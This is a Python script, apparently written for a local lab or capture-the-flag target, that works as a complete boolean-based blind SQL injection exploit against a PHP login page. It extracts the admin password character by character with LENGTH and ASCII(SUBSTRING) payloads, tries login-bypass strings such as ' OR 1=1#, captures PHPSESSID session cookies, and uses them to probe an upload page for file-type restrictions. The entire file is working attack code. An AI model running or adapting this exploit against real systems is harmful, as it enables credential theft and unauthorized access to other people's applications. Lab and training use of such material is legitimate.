import requests
import json
import re
import time

# Configuration
BASE_URL = "http://127.0.0.1:33210"
INDEX_URL = f"{BASE_URL}/index.php"
UPLOAD_URL = f"{BASE_URL}/upload.php"

# Session for requests
session = requests.Session()

def test_sql_condition(payload):
    """Test a SQL condition and return True/False based on response"""
    data = {
        'username': payload,
        'password': 'dummy123',
        'submit': 'Submit'
    }
    
    try:
        response = session.post(INDEX_URL, data=data, allow_redirects=False, timeout=10)
        response_data = response.json()
        return response_data.get('response') == 'password'
    except Exception as e:
        print(f"[!] Error testing condition: {e}")
        return False

def extract_password_length():
    """Extract password length using binary search"""
    print("[*] Extracting password length...")
    low, high = 1, 50  # Reasonable range for password length
    
    # Binary search for length
    while low <= high:
        mid = (low + high) // 2
        payload = f"admin' AND LENGTH(password) > {mid}#"
        
        if test_sql_condition(payload):
            low = mid + 1
        else:
            high = mid - 1
    
    length = low
    print(f"[+] Password length: {length}")
    return length

def extract_password():
    """Extract password using binary search character by character"""
    print("\n[*] Starting password extraction...")
    
    # First get password length
    password_length = extract_password_length()
    
    password = ""
    for pos in range(1, password_length + 1):
        low, high = 32, 126  # Printable ASCII range
        
        # Binary search for each character
        while low <= high:
            mid = (low + high) // 2
            payload = f"admin' AND ASCII(SUBSTRING(password,{pos},1)) > {mid}#"
            
            if test_sql_condition(payload):
                low = mid + 1
            else:
                high = mid - 1
        
        char_code = low
        char = chr(char_code)
        password += char
        print(f"[+] Position {pos}: '{char}' (ASCII {char_code}) - Current password: {password}")
        
        # Small delay to avoid overwhelming the server
        time.sleep(0.1)
    
    print(f"\n[+] Extracted password: {password}")
    return password

def test_bypass_payloads():
    """Test authentication bypass payloads"""
    print("\n[*] Testing authentication bypass payloads...")
    
    bypass_payloads = {
        "a) admin' OR '1'='1'#": "admin' OR '1'='1'#",
        "b) admin'--": "admin'--",
        "c) ' OR 1=1#": "' OR 1=1#",
        "d) admin' AND 1=1#": "admin' AND 1=1#"
    }
    
    successful_payloads = []
    session_cookies = {}
    
    for name, payload in bypass_payloads.items():
        print(f"\n[*] Testing {name}: {payload}")
        
        data = {
            'username': payload,
            'password': 'dummy123',
            'submit': 'Submit'
        }
        
        # Use fresh session for each test
        test_session = requests.Session()
        
        try:
            response = test_session.post(INDEX_URL, data=data, allow_redirects=False, timeout=10)
            
            print(f"[+] Status Code: {response.status_code}")
            print(f"[+] Response Body: {response.text}")
            
            if 'Set-Cookie' in response.headers:
                set_cookie = response.headers['Set-Cookie']
                print(f"[!] SUCCESS! Set-Cookie header found: {set_cookie}")
                
                # Extract PHPSESSID
                phpsessid_match = re.search(r'PHPSESSID=([^;]+)', set_cookie)
                if phpsessid_match:
                    phpsessid = phpsessid_match.group(1)
                    successful_payloads.append((name, payload, phpsessid))
                    session_cookies[name] = phpsessid
                    print(f"[+] PHPSESSID extracted: {phpsessid}")
            else:
                print("[-] No Set-Cookie header in response")
            
            # Check if we got redirected (another sign of success)
            if response.status_code in [301, 302, 303, 307, 308]:
                print(f"[+] Redirect to: {response.headers.get('Location', 'Unknown')}")
            
        except Exception as e:
            print(f"[!] Error testing payload {name}: {e}")
    
    return successful_payloads, session_cookies

def check_upload_page(phpsessid):
    """Check upload.php page with session cookie"""
    print("\n[*] Checking upload.php page...")
    
    # Create session with the cookie
    upload_session = requests.Session()
    upload_session.cookies.set('PHPSESSID', phpsessid)
    
    try:
        response = upload_session.get(UPLOAD_URL, timeout=10)
        
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Response Length: {len(response.text)} bytes")
        
        # Look for upload form
        has_upload_form = 'upload' in response.text.lower()
        if has_upload_form:
            print("[!] Upload form found!")
        
        # Look for file type restrictions (accept attribute)
        file_types = []
        accept_matches = re.findall(r'accept="([^"]*)"', response.text, re.I)
        if accept_matches:
            file_types = accept_matches
            print(f"[+] File type restrictions (accept attribute): {accept_matches}")
        
        # Look for allowed extensions mentioned
        extensions = re.findall(r'\.(jpg|jpeg|png|gif|php|txt|pdf|doc|docx|zip|rar)', response.text, re.I)
        unique_extensions = list(set(extensions))
        if unique_extensions:
            print(f"[+] Allowed extensions mentioned: {unique_extensions}")
        
        # Look for max file size
        size_matches = re.findall(r'max(?:imum)?\s*(?:file)?\s*size[^\d]*(\d+)', response.text, re.I)
        if size_matches:
            print(f"[+] Max file size limits: {size_matches}")
        
        # Look for validation messages or error texts
        if 'validation' in response.text.lower():
            print("[+] Validation messages found in page")
        
        if 'error' in response.text.lower():
            print("[+] Error messages found in page")
        
        # Print full response for detailed analysis
        print(f"\n[+] Full HTML Response:\n{response.text}")
        
        return {
            'status_code': response.status_code,
            'has_upload_form': has_upload_form,
            'file_types': file_types,
            'extensions': unique_extensions,
            'size_limits': size_matches,
            'html_content': response.text
        }
        
    except Exception as e:
        print(f"[!] Error accessing upload.php: {e}")
        return None

def main():
    print("="*70)
    print("SQL Injection Exploitation Tool - Boolean-Based Blind")
    print("="*70)
    
    # Step 1: Extract admin password
    print("\n[STEP 1] Extracting admin password from database...")
    admin_password = extract_password()
    
    # Step 2: Test bypass payloads
    print("\n[STEP 2] Testing authentication bypass payloads...")
    successful_payloads, session_cookies = test_bypass_payloads()
    
    # Step 3: Use first successful session to access upload.php
    print("\n[STEP 3] Accessing upload.php with valid session...")
    upload_info = None
    
    if successful_payloads:
        first_success = successful_payloads[0]
        payload_name = first_success[0]
        phpsessid = first_success[2]
        
        print(f"[*] Using session from {payload_name}")
        print(f"[*] PHPSESSID: {phpsessid}")
        
        upload_info = check_upload_page(phpsessid)
    else:
        print("[-] No successful bypass payloads found")
        print("[*] Checking upload.php without authentication...")
        # Try with existing session
        existing_phpsessid = session.cookies.get('PHPSESSID')
        if existing_phpsessid:
            upload_info = check_upload_page(existing_phpsessid)
        else:
            upload_info = check_upload_page('')
    
    # Final Summary
    print("\n" + "="*70)
    print("FINAL SUMMARY")
    print("="*70)
    print(f"[+] Extracted Admin Password: {admin_password}")
    
    if successful_payloads:
        print(f"[+] Successful Bypass Payloads: {len(successful_payloads)}")
        for name, payload, phpsessid in successful_payloads:
            print(f"  - {name}")
            print(f"    Payload: {payload}")
            print(f"    PHPSESSID: {phpsessid}")
    else:
        print("[-] No successful authentication bypass payloads found")
    
    if upload_info:
        print(f"\n[+] Upload Page Analysis:")
        print(f"  - Status Code: {upload_info['status_code']}")
        print(f"  - Upload Form: {'Yes' if upload_info['has_upload_form'] else 'No'}")
        print(f"  - File Type Restrictions (accept): {upload_info['file_types']}")
        print(f"  - Allowed Extensions: {upload_info['extensions']}")
        print(f"  - Max File Size Limits: {upload_info['size_limits']}")
    else:
        print("[-] Could not analyze upload page")

if __name__ == "__main__":
    main()
